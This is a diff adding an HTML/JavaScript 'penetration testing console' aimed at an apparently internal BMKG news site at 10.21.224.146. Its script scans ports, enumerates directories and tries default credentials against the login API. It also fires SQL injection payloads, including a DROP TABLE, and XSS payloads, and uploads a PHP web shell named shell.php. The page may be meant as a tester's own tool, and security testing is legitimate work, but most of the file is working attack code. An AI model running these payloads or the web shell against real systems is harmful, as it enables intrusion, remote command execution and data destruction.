@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Test - BMKG News</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body class="bg-gray-900 text-white p-8">
+    <div class="max-w-6xl mx-auto">
+        <h1 class="text-3xl font-bold mb-6 text-center">🔍 Advanced Penetration Test</h1>
+        <div class="text-center mb-6">
+            <span class="bg-red-600 text-white px-3 py-1 rounded-full text-sm">
+                Target: <strong>http://10.21.224.146/</strong>
+            </span>
+        </div>
+        
+        <!-- Test Categories -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+            <!-- Information Gathering -->
+            <div class="bg-gray-800 rounded-lg p-6">
+                <h3 class="text-lg font-semibold mb-4 text-blue-400">
+                    <i class="fas fa-search mr-2"></i>Information Gathering
+                </h3>
+                <div class="space-y-2">
+                    <button onclick="scanPorts()" class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 text-sm">
+                        Port Scanning
+                    </button>
+                    <button onclick="fingerprint()" class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 text-sm">
+                        Server Fingerprinting
+                    </button>
+                    <button onclick="enumDirectories()" class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 text-sm">
+                        Directory Enumeration
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Vulnerability Assessment -->
+            <div class="bg-gray-800 rounded-lg p-6">
+                <h3 class="text-lg font-semibold mb-4 text-yellow-400">
+                    <i class="fas fa-bug mr-2"></i>Vulnerability Assessment
+                </h3>
+                <div class="space-y-2">
+                    <button onclick="testAuthentication()" class="w-full bg-yellow-600 text-white p-2 rounded hover:bg-yellow-700 text-sm">
+                        Authentication Bypass
+                    </button>
+                    <button onclick="testAuthorization()" class="w-full bg-yellow-600 text-white p-2 rounded hover:bg-yellow-700 text-sm">
+                        Authorization Flaws
+                    </button>
+                    <button onclick="testInputValidation()" class="w-full bg-yellow-600 text-white p-2 rounded hover:bg-yellow-700 text-sm">
+                        Input Validation
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Exploitation -->
+            <div class="bg-gray-800 rounded-lg p-6">
+                <h3 class="text-lg font-semibold mb-4 text-red-400">
+                    <i class="fas fa-skull-crossbones mr-2"></i>Exploitation
+                </h3>
+                <div class="space-y-2">
+                    <button onclick="attemptSQLi()" class="w-full bg-red-600 text-white p-2 rounded hover:bg-red-700 text-sm">
+                        SQL Injection
+                    </button>
+                    <button onclick="attemptXSS()" class="w-full bg-red-600 text-white p-2 rounded hover:bg-red-700 text-sm">
+                        XSS Exploitation
+                    </button>
+                    <button onclick="attemptFileUpload()" class="w-full bg-red-600 text-white p-2 rounded hover:bg-red-700 text-sm">
+                        File Upload Attack
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Control Panel -->
+        <div class="bg-gray-800 rounded-lg p-6 mb-6">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-semibold">Penetration Test Console</h2>
+                <div class="space-x-2">
+                    <button onclick="runFullPentest()" class="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">
+                        <i class="fas fa-rocket mr-2"></i>Full Pentest
+                    </button>
+                    <button onclick="clearResults()" class="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700">
+                        <i class="fas fa-trash mr-2"></i>Clear
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Results Terminal -->
+            <div id="terminal" class="bg-black rounded p-4 h-96 overflow-y-auto font-mono text-sm">
+                <div class="text-green-400">BMKG News Penetration Testing Framework v1.0</div>
+                <div class="text-green-400">Target: http://10.21.224.146/</div>
+                <div class="text-green-400">Status: Ready</div>
+                <div class="text-yellow-400">root@pentest:~# <span class="animate-pulse">_</span></div>
+            </div>
+        </div>
+        
+        <!-- Vulnerability Summary -->
+        <div id="vulnSummary" class="bg-gray-800 rounded-lg p-6 hidden">
+            <h2 class="text-xl font-semibold mb-4">Vulnerability Summary</h2>
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                <div class="text-center">
+                    <div class="text-2xl font-bold text-red-400" id="criticalCount">0</div>
+                    <div class="text-sm text-gray-400">Critical</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-2xl font-bold text-orange-400" id="highCount">0</div>
+                    <div class="text-sm text-gray-400">High</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-2xl font-bold text-yellow-400" id="mediumCount">0</div>
+                    <div class="text-sm text-gray-400">Medium</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-2xl font-bold text-blue-400" id="lowCount">0</div>
+                    <div class="text-sm text-gray-400">Low</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TARGET = 'http://10.21.224.146';
+        let vulnerabilities = { critical: 0, high: 0, medium: 0, low: 0 };
+        
+        function log(message, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const timestamp = new Date().toLocaleTimeString();
+            
+            let color = 'text-white';
+            let prefix = '[INFO]';
+            
+            switch(type) {
+                case 'success':
+                    color = 'text-green-400';
+                    prefix = '[SUCCESS]';
+                    break;
+                case 'warning':
+                    color = 'text-yellow-400';
+                    prefix = '[WARNING]';
+                    break;
+                case 'error':
+                    color = 'text-red-400';
+                    prefix = '[ERROR]';
+                    break;
+                case 'vuln':
+                    color = 'text-red-300';
+                    prefix = '[VULNERABILITY]';
+                    break;
+            }
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = color;
+            logEntry.innerHTML = `[${timestamp}] ${prefix} ${message}`;
+            
+            terminal.appendChild(logEntry);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function updateVulnCount(severity) {
+            vulnerabilities[severity]++;
+            document.getElementById(severity + 'Count').textContent = vulnerabilities[severity];
+            document.getElementById('vulnSummary').classList.remove('hidden');
+        }
+        
+        async function scanPorts() {
+            log('Starting port scan...', 'info');
+            
+            const commonPorts = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 3306, 5432];
+            let openPorts = [];
+            
+            for (const port of commonPorts) {
+                try {
+                    // Simulate port scanning by testing HTTP on different ports
+                    if (port === 80) {
+                        const response = await fetch(`${TARGET}:${port}`, { 
+                            method: 'HEAD',
+                            mode: 'no-cors'
+                        });
+                        openPorts.push(port);
+                        log(`Port ${port}/tcp open (HTTP)`, 'success');
+                    }
+                } catch (e) {
+                    // Port likely closed or filtered
+                }
+            }
+            
+            if (openPorts.length === 0) {
+                log('No additional open ports detected from browser', 'info');
+            }
+            
+            log(`Port scan completed. ${openPorts.length} ports accessible`, 'info');
+        }
+        
+        async function fingerprint() {
+            log('Starting server fingerprinting...', 'info');
+            
+            try {
+                const response = await fetch(TARGET);
+                const headers = response.headers;
+                
+                log('Server Headers Analysis:', 'info');
+                
+                const serverHeader = headers.get('Server');
+                if (serverHeader) {
+                    log(`Server: ${serverHeader}`, 'warning');
+                    if (serverHeader.includes('Apache') || serverHeader.includes('nginx')) {
+                        log('Web server version detected - potential security risk', 'warning');
+                        updateVulnCount('low');
+                    }
+                } else {
+                    log('Server header not disclosed (good)', 'success');
+                }
+                
+                const poweredBy = headers.get('X-Powered-By');
+                if (poweredBy) {
+                    log(`X-Powered-By: ${poweredBy}`, 'warning');
+                    log('Technology stack disclosed - information leakage', 'warning');
+                    updateVulnCount('low');
+                } else {
+                    log('X-Powered-By header not disclosed (good)', 'success');
+                }
+                
+                // Check for PHP version in headers
+                const phpVersion = headers.get('X-PHP-Version');
+                if (phpVersion) {
+                    log(`PHP Version disclosed: ${phpVersion}`, 'warning');
+                    updateVulnCount('medium');
+                }
+                
+            } catch (e) {
+                log(`Fingerprinting failed: ${e.message}`, 'error');
+            }
+        }
+        
+        async function enumDirectories() {
+            log('Starting directory enumeration...', 'info');
+            
+            const commonDirs = [
+                '/admin/', '/api/', '/backup/', '/config/', '/database/',
+                '/uploads/', '/images/', '/css/', '/js/', '/includes/',
+                '/tmp/', '/temp/', '/logs/', '/phpmyadmin/', '/wp-admin/'
+            ];
+            
+            let foundDirs = [];
+            
+            for (const dir of commonDirs) {
+                try {
+                    const response = await fetch(TARGET + dir, { method: 'HEAD' });
+                    if (response.ok) {
+                        foundDirs.push(dir);
+                        log(`Directory found: ${dir}`, 'warning');
+                        
+                        // Check if directory listing is enabled
+                        const fullResponse = await fetch(TARGET + dir);
+                        const text = await fullResponse.text();
+                        if (text.includes('Index of') || text.includes('Directory Listing')) {
+                            log(`Directory listing enabled: ${dir}`, 'vuln');
+                            updateVulnCount('medium');
+                        }
+                    }
+                } catch (e) {
+                    // Directory not accessible
+                }
+            }
+            
+            log(`Directory enumeration completed. ${foundDirs.length} directories found`, 'info');
+        }
+        
+        async function testAuthentication() {
+            log('Testing authentication mechanisms...', 'info');
+            
+            // Test admin login with common credentials
+            const commonCreds = [
+                { user: 'admin', pass: 'admin' },
+                { user: 'admin', pass: 'password' },
+                { user: 'admin', pass: '123456' },
+                { user: 'root', pass: 'root' },
+                { user: 'bmkg', pass: 'bmkg' }
+            ];
+            
+            for (const cred of commonCreds) {
+                try {
+                    const formData = new FormData();
+                    formData.append('action', 'login');
+                    formData.append('username', cred.user);
+                    formData.append('password', cred.pass);
+                    
+                    const response = await fetch(TARGET + '/api/auth.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        log(`Weak credentials found: ${cred.user}:${cred.pass}`, 'vuln');
+                        updateVulnCount('critical');
+                    } else {
+                        log(`Credentials rejected: ${cred.user}:${cred.pass}`, 'info');
+                    }
+                } catch (e) {
+                    log(`Auth test failed for ${cred.user}:${cred.pass}`, 'error');
+                }
+            }
+            
+            log('Authentication testing completed', 'info');
+        }
+        
+        async function testAuthorization() {
+            log('Testing authorization controls...', 'info');
+            
+            // Test direct access to admin pages
+            const adminPages = [
+                '/admin/index.html',
+                '/admin/admin.js',
+                '/api/manage_news.php',
+                '/api/auth.php'
+            ];
+            
+            for (const page of adminPages) {
+                try {
+                    const response = await fetch(TARGET + page);
+                    
+                    if (response.ok) {
+                        const text = await response.text();
+                        
+                        // Check if page requires authentication
+                        if (!text.includes('login') && !text.includes('authentication')) {
+                            log(`Potential authorization bypass: ${page}`, 'vuln');
+                            updateVulnCount('high');
+                        } else {
+                            log(`Authorization check present: ${page}`, 'success');
+                        }
+                    }
+                } catch (e) {
+                    log(`Could not test authorization for: ${page}`, 'error');
+                }
+            }
+            
+            log('Authorization testing completed', 'info');
+        }
+        
+        async function testInputValidation() {
+            log('Testing input validation...', 'info');
+            
+            const testCases = [
+                { param: 'search', value: '<script>alert("XSS")</script>' },
+                { param: 'category', value: "'; DROP TABLE users; --" },
+                { param: 'limit', value: '-1' },
+                { param: 'page', value: '999999' }
+            ];
+            
+            for (const test of testCases) {
+                try {
+                    const url = `${TARGET}/api/get_news.php?${test.param}=${encodeURIComponent(test.value)}`;
+                    const response = await fetch(url);
+                    const result = await response.json();
+                    
+                    if (result.message && result.message.includes('Error')) {
+                        log(`Input validation error for ${test.param}: ${result.message}`, 'warning');
+                        updateVulnCount('medium');
+                    } else {
+                        log(`Input validation passed for ${test.param}`, 'success');
+                    }
+                } catch (e) {
+                    log(`Input validation test failed for ${test.param}`, 'error');
+                }
+            }
+            
+            log('Input validation testing completed', 'info');
+        }
+        
+        async function attemptSQLi() {
+            log('Attempting SQL injection attacks...', 'info');
+            
+            const sqlPayloads = [
+                "1' OR '1'='1",
+                "1'; DROP TABLE users; --",
+                "1' UNION SELECT 1,2,3,4,5 --",
+                "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+            ];
+            
+            for (const payload of sqlPayloads) {
+                try {
+                    const response = await fetch(`${TARGET}/api/get_news.php?search=${encodeURIComponent(payload)}`);
+                    const text = await response.text();
+                    
+                    // Check for SQL error indicators
+                    if (text.includes('mysql_') || text.includes('SQL syntax') || 
+                        text.includes('ORA-') || text.includes('PostgreSQL')) {
+                        log(`SQL injection vulnerability detected with payload: ${payload}`, 'vuln');
+                        updateVulnCount('critical');
+                    }
+                } catch (e) {
+                    // Continue testing
+                }
+            }
+            
+            log('SQL injection testing completed', 'info');
+        }
+        
+        async function attemptXSS() {
+            log('Attempting XSS attacks...', 'info');
+            
+            const xssPayloads = [
+                '<script>alert("XSS")</script>',
+                '"><img src=x onerror=alert("XSS")>',
+                'javascript:alert("XSS")',
+                '<svg onload=alert("XSS")>'
+            ];
+            
+            for (const payload of xssPayloads) {
+                try {
+                    const response = await fetch(`${TARGET}/api/get_news.php?search=${encodeURIComponent(payload)}`);
+                    const text = await response.text();
+                    
+                    // Check if payload is reflected unescaped
+                    if (text.includes(payload)) {
+                        log(`XSS vulnerability detected with payload: ${payload}`, 'vuln');
+                        updateVulnCount('high');
+                    }
+                } catch (e) {
+                    // Continue testing
+                }
+            }
+            
+            log('XSS testing completed', 'info');
+        }
+        
+        async function attemptFileUpload() {
+            log('Testing file upload vulnerabilities...', 'info');
+            
+            try {
+                // Test if upload endpoint exists
+                const response = await fetch(TARGET + '/api/upload_image.php', {
+                    method: 'POST'
+                });
+                
+                if (response.ok) {
+                    log('File upload endpoint accessible', 'warning');
+                    
+                    // Test malicious file upload
+                    const maliciousFile = new Blob(['<?php system($_GET["cmd"]); ?>'], 
+                        { type: 'application/x-php' });
+                    
+                    const formData = new FormData();
+                    formData.append('file', maliciousFile, 'shell.php');
+                    
+                    const uploadResponse = await fetch(TARGET + '/api/upload_image.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await uploadResponse.json();
+                    
+                    if (result.success) {
+                        log('Malicious file upload successful - CRITICAL VULNERABILITY', 'vuln');
+                        updateVulnCount('critical');
+                    } else {
+                        log('File upload properly validated', 'success');
+                    }
+                } else {
+                    log('File upload endpoint not accessible', 'success');
+                }
+            } catch (e) {
+                log('File upload testing failed', 'error');
+            }
+        }
+        
+        async function runFullPentest() {
+            clearResults();
+            log('Starting comprehensive penetration test...', 'info');
+            log('This may take several minutes...', 'warning');
+            
+            await scanPorts();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await fingerprint();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await enumDirectories();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await testAuthentication();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await testAuthorization();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await testInputValidation();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await attemptSQLi();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await attemptXSS();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await attemptFileUpload();
+            
+            log('Penetration test completed!', 'success');
+            
+            const totalVulns = vulnerabilities.critical + vulnerabilities.high + 
+                              vulnerabilities.medium + vulnerabilities.low;
+            
+            if (totalVulns === 0) {
+                log('No vulnerabilities detected - System appears secure', 'success');
+            } else {
+                log(`Total vulnerabilities found: ${totalVulns}`, 'warning');
+                log(`Critical: ${vulnerabilities.critical}, High: ${vulnerabilities.high}, Medium: ${vulnerabilities.medium}, Low: ${vulnerabilities.low}`, 'warning');
+            }
+        }
+        
+        function clearResults() {
+            document.getElementById('terminal').innerHTML = `
+                <div class="text-green-400">BMKG News Penetration Testing Framework v1.0</div>
+                <div class="text-green-400">Target: http://10.21.224.146/</div>
+                <div class="text-green-400">Status: Ready</div>
+                <div class="text-yellow-400">root@pentest:~# <span class="animate-pulse">_</span></div>
+            `;
+            
+            vulnerabilities = { critical: 0, high: 0, medium: 0, low: 0 };
+            document.getElementById('criticalCount').textContent = '0';
+            document.getElementById('highCount').textContent = '0';
+            document.getElementById('mediumCount').textContent = '0';
+            document.getElementById('lowCount').textContent = '0';
+            document.getElementById('vulnSummary').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
